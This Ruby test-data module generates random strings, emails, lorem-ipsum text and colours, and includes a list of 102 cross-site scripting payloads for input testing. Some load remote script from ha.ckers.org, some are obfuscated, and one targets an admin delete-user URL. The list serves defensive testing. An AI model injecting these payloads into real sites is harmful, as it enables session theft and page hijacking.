# coding: UTF-8
module StringFactory

  LATIN_VOCABULARY = %w{alias consequatur aut perferendis sit voluptatem accusantium doloremque aperiam eaque ipsa quae ab illo inventore veritatis et quasi architecto beatae vitae dicta sunt explicabo aspernatur aut odit aut fugit sed quia consequuntur magni dolores eos qui ratione voluptatem sequi nesciunt neque dolorem ipsum quia dolor sit amet consectetur adipisci velit sed quia non numquam eius modi tempora incidunt ut labore et dolore magnam aliquam quaerat voluptatem ut enim ad minima veniam quis nostrum exercitationem ullam corporis nemo enim ipsam voluptatem quia voluptas sit suscipit laboriosam nisi ut aliquid ex ea commodi consequatur quis autem vel eum iure reprehenderit qui in ea voluptate velit esse quam nihil molestiae et iusto odio dignissimos ducimus qui blanditiis praesentium laudantium totam rem voluptatum deleniti atque corrupti quos dolores et quas molestias excepturi sint occaecati cupiditate non provident sed ut perspiciatis unde omnis iste natus error similique sunt in culpa qui officia deserunt mollitia animi id est laborum et dolorum fuga et harum quidem rerum facilis est et expedita distinctio nam libero tempore cum soluta nobis est eligendi optio cumque nihil impedit quo porro quisquam est qui minus id quod maxime placeat facere possimus omnis voluptas assumenda est omnis dolor repellendus temporibus autem quibusdam et aut consequatur vel illum qui dolorem eum fugiat quo voluptas nulla pariatur at vero eos et accusamus officiis debitis aut rerum necessitatibus saepe eveniet ut et voluptates repudiandae sint et molestiae non recusandae itaque earum rerum hic tenetur a sapiente delectus ut aut reiciendis voluptatibus maiores doloribus asperiores repellat abbas abduco abeo abscido absconditus absens absorbeo absque abstergo absum abundans abutor accedo accendo acceptus accipio accommodo accusator acer acerbitas acervus acidus acies acquiro acsi adamo adaugeo addo adduco ademptio adeo adeptio adfectus adfero adficio adflicto adhaero adhuc adicio adimpleo adinventitias adipiscor adiuvo administratio admiratio admitto admoneo admoveo adnuo adopto adsidue adstringo adsuesco adsum adulatio adulescens adultus aduro advenio adversus advoco aedificium aeger aegre aegrotatio aegrus aeneus aequitas aequus aer aestas aestivus aestus aetas aeternus ager aggero aggredior agnitio agnosco ago ait aiunt alienus alii alioqui aliqua alius allatus alo alter altus alveus amaritudo ambitus ambulo amicitia amiculum amissio amita amitto amo amor amoveo amplexus amplitudo amplus ancilla angelus angulus angustus animadverto animi animus annus anser ante antea antepono antiquus aperio aperte apostolus apparatus appello appono appositus approbo apto aptus apud aqua ara aranea arbitro arbor arbustum arca arceo arcesso arcus argentum argumentum arguo arma armarium armo aro ars articulus artificiose arto arx ascisco ascit asper aspicio asporto assentator astrum atavus ater atqui atrocitas atrox attero attollo attonbitus auctor auctus audacia audax audentia audeo audio auditor aufero aureus auris aurum aut autem autus auxilium avaritia avarus aveho averto avoco baiulus balbus barba bardus basium beatus bellicus bellum bene beneficium benevolentia benigne bestia bibo bis blandior bonus bos brevis cado caecus caelestis caelum calamitas calcar calco calculus callide campana candidus canis canonicus canto capillus capio capitulus capto caput carbo carcer careo caries cariosus caritas carmen carpo carus casso caste casus catena caterva cattus cauda causa caute caveo cavus cedo celebrer celer celo cena cenaculum ceno censura centum cerno cernuus certe certo certus cervus cetera charisma chirographum cibo cibus cicuta cilicium cimentarius ciminatio cinis circumvenio cito civis civitas clam clamo claro clarus claudeo claustrum clementia clibanus coadunatio coaegresco coepi coerceo cogito cognatus cognomen cogo cohaero cohibeo cohors colligo colloco collum colo color coma combibo comburo comedo comes cometes comis comitatus commemoro comminor commodo communis comparo compello complectus compono comprehendo comptus conatus concedo concido conculco condico conduco confero confido conforto confugo congregatio conicio coniecto conitor coniuratio conor conqueror conscendo conservo considero conspergo constans consuasor contabesco contego contigo contra conturbo conventus convoco copia copiose cornu corona corpus correptius corrigo corroboro corrumpo coruscus cotidie crapula cras crastinus creator creber crebro credo creo creptio crepusculum cresco creta cribro crinis cruciamentum crudelis cruentus crur crustulum crux cubicularis cubitum cubo cui cuius culpa culpo cultellus cultura cum cunabula cunae cunctatio cupiditas cupio cuppedia cupressus cur cura curatio curia curiositas curis curo curriculum currus cursim curso cursus curto curtus curvo curvus custodia damnatio damno dapifer debeo debilito decens decerno decet decimus decipio decor decretum decumbo dedecor dedico deduco defaeco defendo defero defessus defetiscor deficio defigo defleo defluo defungo degenero degero degusto deinde delectatio delego deleo delibero delicate delinquo deludo demens demergo demitto demo demonstro demoror demulceo demum denego denique dens denuncio denuo deorsum depereo depono depopulo deporto depraedor deprecator deprimo depromo depulso deputo derelinquo derideo deripio desidero desino desipio desolo desparatus despecto despirmatio infit inflammatio  paens patior patria patrocinor patruus pauci paulatim pauper pax peccatus pecco pecto pectus pecunia pecus peior pel ocer socius sodalitas sol soleo solio solitudo solium sollers sollicito solum solus solutio solvo somniculosus somnus sonitus sono sophismata sopor sordeo sortitus spargo speciosus spectaculum speculum sperno spero spes spiculum spiritus spoliatio sponte stabilis statim statua stella stillicidium stipes stips sto strenuus strues studio stultus suadeo suasoria sub subito subiungo sublime subnecto subseco substantia subvenio succedo succurro sufficio suffoco suffragium suggero sui sulum sum summa summisse summopere sumo sumptus supellex super suppellex supplanto suppono supra surculus surgo sursum suscipio suspendo sustineo suus synagoga tabella tabernus tabesco tabgo tabula taceo tactus taedium talio talis talus tam tamdiu tamen tametsi tamisium tamquam tandem tantillus tantum tardus tego temeritas temperantia templum temptatio tempus tenax tendo teneo tener tenuis tenus tepesco tepidus ter terebro teres terga tergeo tergiversatio tergo tergum termes terminatio tero terra terreo territo terror tersus tertius testimonium texo textilis textor textus thalassinus theatrum theca thema theologus thermae thesaurus thesis thorax thymbra thymum tibi timidus timor titulus tolero tollo tondeo tonsor torqueo torrens tot totidem toties totus tracto trado traho trans tredecim tremo trepide tres tribuo tricesimus triduana triginta tripudio tristis triumphus trucido truculenter tubineus tui tum tumultus tunc turba turbo turpe turpis tutamen tutis tyrannus uberrime ubi ulciscor ullus ulterius ultio ultra umbra umerus umquam una unde undique universe unus urbanus urbs uredo usitas usque ustilo ustulo usus uter uterque utilis utique utor utpote utrimque utroque utrum uxor vaco vacuus vado vae valde valens valeo valetudo validus vallum vapulus varietas varius vehemens vel velociter velum velut venia venio ventito ventosus ventus venustas ver verbera verbum vere verecundia vereor vergo veritas vero versus verto verumtamen verus vesco vesica vesper vespillo vester vestigium vestrum vetus via vicinus vicissitudo victoria victus videlicet video viduata viduo vigilo vigor vilicus vilis vilitas villa vinco vinculum vindico vinitor vinum vir virga virgo viridis viriliter virtus vis viscus vita vitiosus vitium vito vivo vix vobis vociferor voco volaticus volo volubilis voluntarius volup volutabrum volva vomer vomica vomito vorago vorax voro vos votum voveo vox vulariter vulgaris vulgivagus vulgo vulgus vulnero vulnus vulpes vulticulus vultuosus xiphias}

  # A random string creator that draws from all printable ASCII characters
  # from 33 to 128. Default length is 10 characters.
  # @param length [Integer] The count of characters in the string
  # @param s [String] Typically this will be left blank, but if included, any string created will be prepended with s. Note that the string length will still be as specified
  def random_string(length=10, s="")
    length.enum_for(:times).inject(s) do |result, index|
      s << rand(93) + 33
    end
  end

  # A random string creator that draws from all printable ASCII and High ASCII characters
  # from 33 to 256. Default length is 10 characters.
  # @param length [Integer] The count of characters in the string
  # @param s [String] Typically this will be left blank, but if included, any string created will be prepended with s. Note that the string length will still be as specified
  def random_high_ascii(length=10, s="")
    length.enum_for(:times).inject(s) do |result, index|
      s << rand(223) + 33
    end
  end

  # A "friendlier" random string generator. No characters need to be escaped for valid URLs.
  # Uses no Reserved or "Unsafe" characters.
  # Also excludes the comma, the @ sign and the plus sign. Default length is 10 characters.
  def random_nicelink(length=10)
    chars = %w{a b c d e f g h j k m n p q r s t u v w x y z A B C D E F G H J K L M N P Q R S T U V W X Y Z 0 1 2 3 4 5 6 7 8 9 _ - .}
    (0...length).map { chars[rand(chars.size)]}.join
  end

  # Returns a string that is properly formatted like an email address.
  # The string returned defaults to 268 characters long.
  # @param x [Integer] This is not the length of the whole string, but only of the "name" portion of the email, minus 2.
  def random_email(x=62)
    x > 62 ? x=62 : x=x
    chars = %w{a b c d e f g h j k m n p q r s t u v w x y z A B C D E F G H J K L M N P Q R S T U V W X Y Z 0 1 2 3 4 5 6 7 8 9 ! # $ % & ' * + - / = ? ^ _ ` { | } ~}
    random_alphanums(1) + (0...x).map { chars[rand(chars.size)]}.join + random_alphanums(1) + "@" + random_alphanums(60) + ".com"
  end

  # A random string generator that uses all characters
  # available on an American Qwerty keyboard.
  # @param length [Integer] The count of characters in the string
  # @param s [String] Typically this will be left blank, but if included, any string created will be prepended with s. Note that the string length will still be as specified
  def random_alphanums_plus(length=10, s="")
    chars = %w{ a b c d e f g h j k m n p q r s t u v w x y z A B C D E F G H J K L M N P Q R S T U V W X Y Z 0 1 2 3 4 5 6 7 8 9 ` ~ ! @  # $% ^ & * ( ) _ + - = { } [ ] \ : " ; ' < > ? , . / }
    length.times { s << chars[rand(chars.size)] }
    s.to_s
  end

  # A random string generator that uses only letters and numbers in the string. Default length is 10 characters.
  # @param length [Integer] The count of characters in the string
  # @param s [String] Typically this will be left blank, but if included, any string created will be prepended with s. Note that the string length will still be as specified
  def random_alphanums(length=10, s="")
    chars = 'abcdefghjkmnpqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ0123456789'
    length.times { s << chars[rand(chars.size)] }
    s.to_s
  end

  # A random string generator that uses only lower case letters.
  # @param length [Integer] The count of characters in the string
  # @param s [String] Typically this will be left blank, but if included, any string created will be prepended with s. Note that the string length will still be as specified
  def random_letters(length=10, s="")
    chars = 'abcdefghjkmnpqrstuvwxyz'
    length.times { s << chars[rand(chars.size)] }
    s.to_s
  end

  # Returns a block of text (of the specified type, see below) containing
  # the specified number of "words" (each containing between 1 and 16 chars)
  # randomly spread across the specified number of lines (note that
  # the method does not allow the line count to be larger than
  # the word count and will "fix" it if it is).
  #
  # @param word_count [Integer] The count of "words" in the string, separated by spaces or line feeds. If no parameters are provided, the method will return two alphanumeric "words" on two lines.
  # @param line_count [Integer] The count of line feeds that will be randomly placed throughout the string
  # @param char_type [:symbol] Determines the character content of the string.
  #   :alpha => "Alphanumeric" - Uses the #random_alphanums method
  #   :string => uses the #random_string method, so chars 33 through 128 will be included
  #   :ascii => All ASCII chars from 33 to 256 are fair game -> uses #random_high_ascii
  #   :lorem => Will generate a pseudo-lorem-ipsum block of text using the LATIN_VOCABULARY constant as the source
  def random_multiline(word_count=2, line_count=2, char_type=:alpha)
    char_methods = {:alpha=>"random_alphanums(rand(16)+1)", :string=>"random_string(rand(16)+1)", :ascii=>"random_high_ascii(rand(16)+1)", :lorem=>"LATIN_VOCABULARY[rand(LATIN_VOCABULARY.length)]"}
    if line_count > word_count
      line_count = word_count - 1
    end
    words = []
    non_words = []
    word_count.times { words << eval(char_methods[char_type]) } # creating the words, adding to the array
    (line_count - 1).times { non_words << "\n" } # adding the number of line feeds
    unless word_count==line_count
      (word_count - line_count - 1).times { non_words << " " } # adding the right number of spaces
    end
    non_words.shuffle! # Have to shuffle the line feeds around!
    array = words.zip(non_words)
    array.flatten!
    array.join("")
  end

  # Picks at random from the list of XSS test strings, using
  # the provided number as size of the list to choose from.
  # It will randomly pre-pend the string with HTML closing tags.
  #
  # The strings are organized by length, with the shorter ones
  # first. There are 102 strings.
  # @param number [Integer] Should be a number between 1 and 102
  def random_xss_string(number=102)
    number > 102 ? number = 102 : number
    xss = ["<PLAINTEXT>", "\\\";alert('XSS');//", "'';!--\"<XSS>=&{()}", "<IMG SRC=\"mocha:alert('XSS')\">", "<BODY ONLOAD=alert('XSS')>", "<BODY ONLOAD =alert('XSS')>", "<BR SIZE=\"&{alert('XSS')}\">", "¼script¾alert(¢XSS¢)¼/script¾", "<IMG SRC=\"livescript:alert('XSS')\">", "<SCRIPT SRC=//ha.ckers.org/.j>", "<IMG SRC=javascript:alert('XSS')>", "<IMG SRC=JaVaScRiPt:alert('XSS')>", "<<SCRIPT>alert(\"XSS\");//<</SCRIPT>", "<IMG SRC=\"javascript:alert('XSS')\"", "<IMG SRC='vbscript:msgbox(\"XSS\")'>", "<A HREF=\"http://1113982867/\">XSS</A>", "<IMG SRC=\"javascript:alert('XSS');\">", "<IMG SRC=\"jav\tascript:alert('XSS');\">", "<XSS STYLE=\"behavior: url(xss.htc);\">", "</TITLE><SCRIPT>alert(\"XSS\");</SCRIPT>", "<IMG DYNSRC=\"javascript:alert('XSS')\">", "<A HREF=\"http://66.102.7.147/\">XSS</A>", "<IMG LOWSRC=\"javascript:alert('XSS')\">", "<BGSOUND SRC=\"javascript:alert('XSS');\">", "<BASE HREF=\"javascript:alert('XSS');//\">", "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">", "<SCRIPT>a=/XSS/ alert(a.source)</SCRIPT>", "<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">", "<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">", "<XSS STYLE=\"xss:expression(alert('XSS'))\">", "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">", "<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>", "<IMG SRC=\" &#14; javascript:alert('XSS');\">", "<IMG SRC=javascript:alert(&quot;XSS&quot;)>", "<BODY BACKGROUND=\"javascript:alert('XSS')\">", "<TABLE BACKGROUND=\"javascript:alert('XSS')\">", "<DIV STYLE=\"width: expression(alert('XSS'));\">", "<TABLE><TD BACKGROUND=\"javascript:alert('XSS')\">", "<iframe src=http://ha.ckers.org/scriptlet.html <", "<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>", "<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>", "<A HREF=\"http://0x42.0x0000066.0x7.0x93/\">XSS</A>", "<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\">", "<A HREF=\"http://0102.0146.0007.00000223/\">XSS</A>", "<IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`>", "<SCRIPT/SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", "<SCRIPT SRC=\"http://ha.ckers.org/xss.jpg\"></SCRIPT>", "<STYLE TYPE=\"text/javascript\">alert('XSS');</STYLE>", "<BODY onload!\#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>", "<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">", "<STYLE>@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';</STYLE>", "<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>", "<SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", "<? echo('<SCR)'; echo('IPT>alert(\"XSS\")</SCRIPT>'); ?>", "<SCRIPT =\">\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", "<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">", "<SCRIPT a=`>` SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", "<SCRIPT a=\">\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", "<LAYER SRC=\"http://ha.ckers.org/scriptlet.html\"></LAYER>", "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>", "<SCRIPT \"a='>'\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", "<LINK REL=\"stylesheet\" HREF=\"http://ha.ckers.org/xss.css\">", "<SCRIPT a=\">'>\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", "<SCRIPT a=\">\" '' SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", "<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>", "<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">", "perl -e 'print \"<SCR\\0IPT>alert(\\\"XSS\\\")</SCR\\0IPT>\";' > out", "<IMG SRC = \" j a v a s c r i p t : a l e r t ( ' X S S ' ) \" >", "Redirect 302 /a.jpg http://www.rsmart.com/admin.asp&deleteuser", "perl -e 'print \"<IMG SRC=java\\0script:alert(\\\"XSS\\\")>\";' > out", "<!--[if gte IE 4]> <SCRIPT>alert('XSS');</SCRIPT> <![endif]-->", "<DIV STYLE=\"background-image: url(&#1;javascript:alert('XSS'))\">", "<A HREF=\"http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D\">XSS</A>", "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">", "a=\"get\"; b=\"URL(\\\"\"; c=\"javascript:\"; d=\"alert('XSS');\\\")\"; eval(a+b+c+d);", "<STYLE>BODY{-moz-binding:url(\"http://ha.ckers.org/xssmoz.xml#xss\")}</STYLE>", "<EMBED SRC=\"http://ha.ckers.org/xss.swf\" AllowScriptAccess=\"always\"></EMBED>", "<STYLE type=\"text/css\">BODY{background:url(\"javascript:alert('XSS')\")}</STYLE>", "<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS", "<META HTTP-EQUIV=\"Link\" Content=\"<http://ha.ckers.org/xss.css>; REL=stylesheet\">", "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\">", "<OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http://ha.ckers.org/scriptlet.html\"></OBJECT>", "<SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", "<STYLE>.XSS{background-image:url(\"javascript:alert('XSS')\");}</STYLE><A CLASS=XSS></A>", "<XML SRC=\"xsstest.xml\" ID=I></XML> <SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>", "<META HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;\">", "exp/*<A STYLE='no\\xss:noxss(\"*//*\"); xss:&#101;x&#x2F;*XSS*//*/*/pression(alert(\"XSS\"))'>", "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">", "<!--#exec cmd=\"/bin/echo '<SCR'\"--><!--#exec cmd=\"/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'\"-->", "<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>", "<HTML xmlns:xss> <?import namespace=\"xss\" implementation=\"http://ha.ckers.org/xss.htc\"> <xss:xss>XSS</xss:xss> </HTML>", "<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>", "<HEAD><META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text/html; charset=UTF-7\"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-", "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>", "<XML ID=I><X><C><![CDATA[<IMG SRC=\"javas]]><![CDATA[cript:alert('XSS');\">]]> </C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>", "<XML ID=\"xss\"><I><B>&lt;IMG SRC=\"javas<!-- -->cript:alert('XSS')\"&gt;</B></I></XML> <SPAN DATASRC=\"#xss\" DATAFLD=\"B\" DATAFORMATAS=\"HTML\"></SPAN>", "<DIV STYLE=\"background-image:\\0075\\0072\\006C\\0028'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029'\\0029\">", "<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>", "';alert(String.fromCharCode(88,83,83))//\\';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\\\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>", "<HTML><BODY> <?xml:namespace prefix=\"t\" ns=\"urn:schemas-microsoft-com:time\"> <?import namespace=\"t\" implementation=\"#default#time2\"> <t:set attributeName=\"innerHTML\" to=\"XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;\"> </BODY></HTML>", "<EMBED SRC=\"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"></EMBED>"]
    prepend=[ %|"|, %||, %|">|, %|>| ]
    "#{prepend[rand(prepend.length)]} #{xss[rand(number)]}"
  end

  # Returns a random hex string that matches an HTML color value.
  def random_hex_color
    "#"+("%06x" % (rand * 0xffffff)).upcase
  end

end